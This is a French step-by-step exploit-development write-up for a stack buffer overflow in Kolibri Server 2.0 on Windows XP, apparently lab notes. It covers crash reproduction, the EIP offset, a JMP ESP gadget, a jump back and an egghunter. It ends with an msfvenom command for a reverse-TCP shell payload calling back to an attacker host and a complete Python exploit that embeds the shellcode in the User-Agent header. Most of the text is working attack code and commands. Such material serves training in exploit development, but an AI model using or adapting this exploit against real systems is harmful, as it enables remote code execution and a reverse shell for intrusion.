# Kolibri Server 2.0

Prérequis :


* [Kolibri Server 2.0](https://www.exploit-db.com/apps/4d4e15b98e105facf94e4fd6a1f9eb78-Kolibri-2.0-win.zip)
* [Exploit Initial](https://www.exploit-db.com/exploits/16970)
* [Windows XP SP3 x86](https://www.mes-vms.fr/machine-virtuelle-windows-xp-professionnel-sp3-32bits-en-francais/)
* [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
* [Mona](https://github.com/corelan/mona)

## Les différentes étapes

1. Fuzzing
2. Identifier l'exception
3. Identifier les badchars
4. Créer un pattern
5. Localiser l'EIP
6. Trouver un JMP ESP
7. Créer un JMP back
8. Générer un egghunter
9. Trouver de la place pour l'egg
10. Utiliser le egghunter
11. Générer l'exploit

## Etape 1 : Fuzzing

A faire

## Etape 2 : Identifier l'exception

```PYTHON
#!/usr/bin/python
import socket
import os
import sys

Stage1="A"*600

buffer = (
"HEAD /"+ Stage1 + " HTTP/1.1\r\n"
"Host: 192.68.43.26:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.43.26", 8080))
expl.send(buffer)
expl.close

````

L'EIP est bien écrasé par nos "A".

![](images/crash.png)

## Etape 3 : Identifier les badchars 

Les badchars sont : **\x00\x0d\x0a\x3d\x20\x3f**

## Etape 4 : Créer un pattern 

On crée un pattern d'une longueur de 600 (taille équivalente à notre payload envoyée lors du crash) :

```BASH
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

```PYTHON
#!/usr/bin/python
import socket
import os
import sys

Stage1="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"

buffer = (
"HEAD /"+ Stage1 + " HTTP/1.1\r\n"
"Host: 192.68.43.26:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.43.26", 8080))
expl.send(buffer)
expl.close
```

Kolibri Server crash sur la valeur du pattern : 32724131

## Etape 5 : Localiser l'EIP

Trouver l'emplacement de l'EIP : !mona findmsp

L'EIP est à la position 515

![](images/find_eip.png)

On peut confirmer l'EIP grâce au payload suivant : "A" * 515+"B" * 4+"C" * (600-515-4)

## Etape 6 : Trouver un JMP ESP

L'objectif est de trouver un jmp ESP pour remonter au sommet de la pile : !mona jmp -r esp

![](images/jmp_esp.png)

On prend ensuite un : **push esp**

Attention bien aller dans le fichier jmp.txt dans le dossier de immunity debugger.

Idéalement on ne prend pas les DLL de l'OS.

```
0x77c21025 : push esp # ret  |  {PAGE_EXECUTE_READ} [msvcrt.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\msvcrt.dll)
```

## Etape 7 : Créer un JMP back

Il est nécessaire de faire un jump back pour revenir dans notre buffer (dans lequel on placera notre egghunter)

On calcul un : **jmp -200** 

On choisit un nombre négatif arbitraire et on le converti en hexa ce qui nous donne : -200 => \xcc

L'instruction hexa pour jmp est **\xEB** on obtient alors **\xeb\xcc**


## Etape 8 : Générer un egghunter

On génère le egghunter : !mona egg -t beef

![](images/egg_hunter.png)

Le egghunter fait une taille de 32 bytes.

On obtient alors : **A * 478 + egghunter + A * 5 + EIP + jmp_back**

**Attention à pas executer directement sinon le egghunter va chercher dans le vide.**

## Etape 9 : Trouver de la place pour l'egg

L'idée est de trouver un emplacement dans lequel on va pouvoir stocker notre shellcode.

Le champ "User-Agent" à son propre espace mémoire, donc on positionne notre egg + "B" * 1000 dedans. 

## Etape 10 : Utiliser le egghunter

Maintenant que on a toutes les informations nécessaires on peut lancer notre egghunter.


```PYTHON
#!/usr/bin/python
import socket
import os
import sys


hunter=("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x62\x65\x65\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

Stage1="A"*478+hunter+"\x25\x10\xc2\x77"+"A"*5+"\xeb\xcc"

Stage2="B"*1000

buffer = (
"HEAD /"+ Stage1 + " HTTP/1.1\r\n"
"Host: 192.68.43.26:8080\r\n"
"User-Agent: "+"beefbeef"+Stage2+"\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.43.26", 8080))
expl.send(buffer)
expl.close
```

On voit que notre egghunter a bien retrouvé les eggs et le programme plante sur **42424242**.


## Etape 11 : Générer l'exploit


On génère notre shellcode en enlevant les badchars :
```BASH
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.85.129 LPORT=443 -b"\x00\x0d\x0a\x3d\x20\x3f" -f python EXITFUNC=thread -a x86
```

On assemble le tout et on exploite :


```PYTHON
#!/usr/bin/python
import socket
import os
import sys


hunter=("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x62\x65\x65\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

Stage1="A"*478+hunter+"A"*5+"\x25\x10\xc2\x77"+"\xeb\xcc"

shellcode =  ""
shellcode += "\xb8\x9f\xe7\x9d\xbb\xdb\xd4\xd9\x74\x24\xf4\x5b\x31"
shellcode += "\xc9\xb1\x52\x31\x43\x12\x83\xeb\xfc\x03\xdc\xe9\x7f"
shellcode += "\x4e\x1e\x1d\xfd\xb1\xde\xde\x62\x3b\x3b\xef\xa2\x5f"
shellcode += "\x48\x40\x13\x2b\x1c\x6d\xd8\x79\xb4\xe6\xac\x55\xbb"
shellcode += "\x4f\x1a\x80\xf2\x50\x37\xf0\x95\xd2\x4a\x25\x75\xea"
shellcode += "\x84\x38\x74\x2b\xf8\xb1\x24\xe4\x76\x67\xd8\x81\xc3"
shellcode += "\xb4\x53\xd9\xc2\xbc\x80\xaa\xe5\xed\x17\xa0\xbf\x2d"
shellcode += "\x96\x65\xb4\x67\x80\x6a\xf1\x3e\x3b\x58\x8d\xc0\xed"
shellcode += "\x90\x6e\x6e\xd0\x1c\x9d\x6e\x15\x9a\x7e\x05\x6f\xd8"
shellcode += "\x03\x1e\xb4\xa2\xdf\xab\x2e\x04\xab\x0c\x8a\xb4\x78"
shellcode += "\xca\x59\xba\x35\x98\x05\xdf\xc8\x4d\x3e\xdb\x41\x70"
shellcode += "\x90\x6d\x11\x57\x34\x35\xc1\xf6\x6d\x93\xa4\x07\x6d"
shellcode += "\x7c\x18\xa2\xe6\x91\x4d\xdf\xa5\xfd\xa2\xd2\x55\xfe"
shellcode += "\xac\x65\x26\xcc\x73\xde\xa0\x7c\xfb\xf8\x37\x82\xd6"
shellcode += "\xbd\xa7\x7d\xd9\xbd\xee\xb9\x8d\xed\x98\x68\xae\x65"
shellcode += "\x58\x94\x7b\x29\x08\x3a\xd4\x8a\xf8\xfa\x84\x62\x12"
shellcode += "\xf5\xfb\x93\x1d\xdf\x93\x3e\xe4\x88\x5b\x16\xcd\xcc"
shellcode += "\x34\x65\x11\xcc\x7f\xe0\xf7\xa4\x6f\xa5\xa0\x50\x09"
shellcode += "\xec\x3a\xc0\xd6\x3a\x47\xc2\x5d\xc9\xb8\x8d\x95\xa4"
shellcode += "\xaa\x7a\x56\xf3\x90\x2d\x69\x29\xbc\xb2\xf8\xb6\x3c"
shellcode += "\xbc\xe0\x60\x6b\xe9\xd7\x78\xf9\x07\x41\xd3\x1f\xda"
shellcode += "\x17\x1c\x9b\x01\xe4\xa3\x22\xc7\x50\x80\x34\x11\x58"
shellcode += "\x8c\x60\xcd\x0f\x5a\xde\xab\xf9\x2c\x88\x65\x55\xe7"
shellcode += "\x5c\xf3\x95\x38\x1a\xfc\xf3\xce\xc2\x4d\xaa\x96\xfd"
shellcode += "\x62\x3a\x1f\x86\x9e\xda\xe0\x5d\x1b\xfa\x02\x77\x56"
shellcode += "\x93\x9a\x12\xdb\xfe\x1c\xc9\x18\x07\x9f\xfb\xe0\xfc"
shellcode += "\xbf\x8e\xe5\xb9\x07\x63\x94\xd2\xed\x83\x0b\xd2\x27"

#Stage2="A"*1000

buffer = (
"HEAD /"+ Stage1 + " HTTP/1.1\r\n"
"Host: 192.68.43.26:8080\r\n"
"User-Agent: "+"beefbeef"+shellcode+"\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.43.26", 8080))
expl.send(buffer)
expl.close
```



